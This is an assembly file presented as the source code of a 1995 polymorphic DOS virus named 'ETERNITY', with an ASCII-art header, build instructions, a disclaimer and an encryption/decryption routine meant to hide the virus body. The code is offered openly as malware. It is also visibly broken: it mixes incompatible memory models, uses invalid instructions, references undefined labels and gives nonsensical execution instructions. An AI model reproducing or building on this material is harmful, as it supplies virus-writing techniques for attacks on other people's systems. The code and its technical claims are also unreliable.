;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;
;                       [ ETERNITY ] - (c) 1995 by Crypt Keeper  
;              ---------------------------------------------------------
;                      "Sacrifice myself to the demon..." 
;
;
; This is my first attempt on a polymorphic engine. I think it's OK, but, as
; always there are things that can be improved and things that could be done
; better. Anyhow, this was fun too! I would love to hear your comments!
;               I hope you like it...
;
;
;                    <>>>><<<<>  <>>>>>>>
;                                 #    #
;                               #      #
;                             #        #
;                           #          #
;                         #            #
;                       #              #
;                     #                #
;                   #                  #
;                 #   *     *    +     #
;                #                        # 
;               #                          # 
;              #                            # 
;             #                              # 
;            #                                # 
;           #                                  # 
;          #                                    # 
;         #                                      # 
;        #                                        #
;       #                                          # 
;      #                                            # 
;     #                                              # 
;    #                                                # 
;   #                                                  # 
;  #                                                    # 
; #                                                      # 
;(                                                       # 
;                                                         <>####<>     
;                                                          >>>>>>>>>>>>>
;
;  For those of u who wonder how it can be a POLY morphing when it can be clearly
;  seen disassembled... Well, it has polymorphing capabilities ONLY for the loop
;  inside the encrypt/decrypt routine. Outside of that loop, ANY number of thingz
;  can change and still work. The code OUTSIDE the polymorphic zone does not even
;  need to be polymorphic to make the whole engine work. That's what I call TRUE
;  POLYMORPHIC! So far, only one person got through it and understand it all.
;  Nice going man... Anyway, the moral of the story is: Just because YOU cannot 
;  understand it, does NOT mean that there is no polymorphism happening in there!
;
;  Enough talk for now! Here it is...
;
;
;  Compile with TASM & TLINK:
;      TASM /m3 ETN.virus
;      TLINK /t ETN.virus
;
;  Remember: To execute the virus copy the bytes from 'VIRUS_START' to 'END_VIRUS'
;            into the target file's 'INT 1Eh' vector area. (Or use one of the MANY
;            published virus mutators).
;
;
;  Disclaimer:
;  -----------
;  This is the source code of a VIRUS! The author is not responsible for any
;  damage caused by anyone who uses or abuses this source code.
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

                .586p                                   ; A 80586 processor?
                MODEL FLAT                               ; No more segmentation!

VirSize         equ     Virus_End-Virus_Start       ; Set the size of the virus 
						; for the encryption routine.

Text            equ     offset Virus_Body           ; The entry point to the
						; encrypted virus body.

                org     0100h                           ; Push an int 20 onto the stack?

start:
                jmp     Virus_Body                      ; Call the encryption routine,
							; decrypt  & jump there.

	db      '[ETERNITY]'                       ; Some nice name for the virus body.

Virus_Body:
                mov     ebp,00000000h                    ; Zero out the register.

                mov     eax,00400000h                    ; The address of the buffer,
							    ; containing the host program,
				mov     edi,eax                       ; will be found here,
							    ; plus four bytes.
                add     edi,00000004h
                sub     edi,edi                         ; Zero out the register.
                mov     edx,VirSize                     ; Move the virusesize to edx.
                xor     ebx,ebx                         ; Again....

Decrypt_Loop:
                repnz   scasb                           ; Find the start of the
                                                        ; decrypted virus body.
                cmp     byte ptr [edi-1],0e9h            ; Check if a JMP?
                je      Decrypt_Loop                      ; Yes? Then continue until
                                                        ; the the next instruction
                                                        ; is found.

Build_JMPs:
                lea     esi,[ebp+delta_offset]          ; Build relative JMP's to
                                                        ; keep the decryption routine
                                                        ; small. (2 bytes).
                mov     byte ptr [edi],0e9h
                sub     edi,esi
                mov     byte ptr [edi],al
                inc     edi

Jump_To_Virus_Body:

                mov     esi,eax                         ; Move the address of the
                                                        ; start of the hosts image
                                                        ; to esi.

                push    eax                             ; Push everything used on
                push    ecx                             ; the stack so it can
                push    edx                             ; be restored later on.
                push    ebp

                mov     ecx,0000001Ch                   ; We're only interested in
                int     00000021h                       ; some registries...

                pop     ebp
                pop     edx
                pop     ecx
                pop     esi

Start_Decryption:
                retn                                    ; Now return control to
                                                        ; the host program.


;===============================================================================
;
;                              Encryption routine
;
;===============================================================================


Xored_Reg       db      00000000h                   ; The reg holding the Xor val.
Reg_Choice_1    db      10000001h                   ; Reg choice #1 (repitition count).
Reg_Choice_2    db      10000001h                   ; Reg choice #2 (loop counter).

Switch_Regs:
                cmp     al,5dh                            ; Do we have a REGISTER left to choose from?
                jb      Switch_Regs                       ; Yep, try again...
                cmp     al,4bh                            ; One more?
                jb      No_More_Regs                      ; Nope... then no regs left...
                ret                                       ; Return immediately.

No_More_Regs:
                cmp     al,01h                            ; Is AX the reg that will be used?
                jne     Switch_Regs                       ; If not, get another reg.
                jmp     Fill_Xored_Val                    ; Ype! Now fill up the Xored_Val.

Fill_Xored_Val:
                mov     ah,02ch                           ; Get the current time.
                int     00000021h

                mov     bp,dx                             ; Put the secs value into BP.
                shl     bp,00000002h                      ; Make room for the lower 8 bits.
                rcl     bp,00000007h                      ; Mix'em all together.

                xor     bp,0deadh                         ; Just in case ;)

                mov     Xored_Reg,bp                      ; Store the Xor value.
                mov     bl,ah                             ; And also in BL (for further use).

Make_Reg_1:
                cmp     Reg_Choice_1,01h                  ; Have we already choosen this reg?
                jbe     Get_Next_Reg_1                    ; Yep, get another one...
                jmp     Fill_Jmp_Routine                  ; Nop, then build the JMP's.

Get_Next_Reg_1:
                cmp     Reg_Choice_1,5dh                  ; Are there any registers left?
                ja      Switch_Regs                       ; Nope.. then do nothing else.
                inc     Reg_Choice_1                      ; Yep, go ahead and choose one...
                jmp     Make_Reg_1

Fill_Jmp_Routine:
                cmp     byte ptr ds:[Startup_JMP+3],0eh   ; Will the encryption routine be moved around in memory ?
                je      Jmp_Routine_In_Code               ; Yep! then adjust the JMP's.
                jmp     Start_Encryption                  ; Noo! then just begin encrypting.

Jmp_Routine_In_Code:
                mov     esi,offset Startup_JMP            ; Ok, adjust the encryption
                mov     ecx,00000003h                     ; routine's position.
                rep     movsb                             ;
							;
Decryption_Proc:                                     ;
                mov     esi,Text                          ; The beginning of the proc.   
                mov     ecx,VirSize                       ; It takes the size of the        
                repe    scasb                            ; decryption routine.               
                                                        ;                                                                  
Build_Encrypt_1:                                      ;
                xor     [esi-1],bl                        ; Encrypt one byte.               
                roll    bl,1                              ;                                                              
                loop    Build_Encrypt_1                   ; Repeat until done.              
                                                        ;                                                                  
Done_Build:                                            ;
                mov     esi,offset Startup_JMP            ; Restore the original           
                mov     ecx,00000003h                     ; position of the encryption    
                rep     movsb                             ; routine's JMP's.                
                                                        ;                                                                
Loop_Counter_1:                                      ;
                mov     esi,Reg_Choice_2                  ; Time to terminate our loop?    
                test    byte ptr [esi],01h                 ; Register EAX has been chosen?   
                jnz     Loop_Conditional_Jmp              ; Yep, then finish up.            
